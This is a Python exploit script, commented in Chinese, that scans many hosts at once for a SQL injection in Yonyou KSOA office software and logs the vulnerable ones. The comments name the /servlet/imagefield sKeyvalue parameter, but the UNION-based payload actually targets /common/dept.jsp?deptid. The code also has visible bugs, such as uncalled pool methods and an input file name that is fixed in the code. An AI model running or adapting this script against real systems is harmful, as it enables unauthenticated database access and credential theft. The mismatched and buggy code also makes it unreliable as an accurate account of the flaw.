#用友时空KSOA /servlet/imagefield接口中sKeyvalue参数存在sql注入漏洞，
#未经身份认证的攻击者可通过该漏洞获取数据库敏感信息及凭证，最终可能导致服务器失陷。
import requests,sys,argparse,urllib3
from multiprocessing.dummy import Pool

urllib3.disable_warnings()

def main():
    parse = argparse.ArgumentParser(description="用友时空KSOA /servlet/imagefield接口中sKeyvalue参数存在sql注入")

    parse.add_argument('-u','-url',dest='url',type=str,help="Please input -h")
    parse.add_argument('-f','-file',dest='file',type=str,help="Please input -h")

    args = parse.parse_args()

    if args.url and not args.file:
        poc(args.url.strip())
    elif args.file and not args.url:
        lis = []
        with open('url.txt','r',encoding='utf-8')as fp:
            for url in fp.readlines():
                lis.append(url.strip())
            mp = Pool(100)
            mp.map(poc,lis)
            mp.close
            mp.join

    print("Usage：python "+sys.argv[0]+' -h')



def poc(target):
    payload = '/common/dept.jsp?deptid=1%27%20UNION%20ALL%20SELECT%2060%2Csys.fn_sqlvarbasetostr(HASHBYTES(%27MD5%27%2C%2712345%27))--'
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.5414.120 Safari/537.36',
        'Connection': 'close'
    }
    try:
        res1 = requests.get(url = target+payload,headers=headers,timeout=5,verify=False)
        if '827ccb0eea8a706c4c34a16891f84e7' in res1.text:
            with open('result.txt','a',encoding='utf-8')as f:
                f.write(target+'\n')
    except Exception as e:
        pass

if __name__ == '__main__':
    main()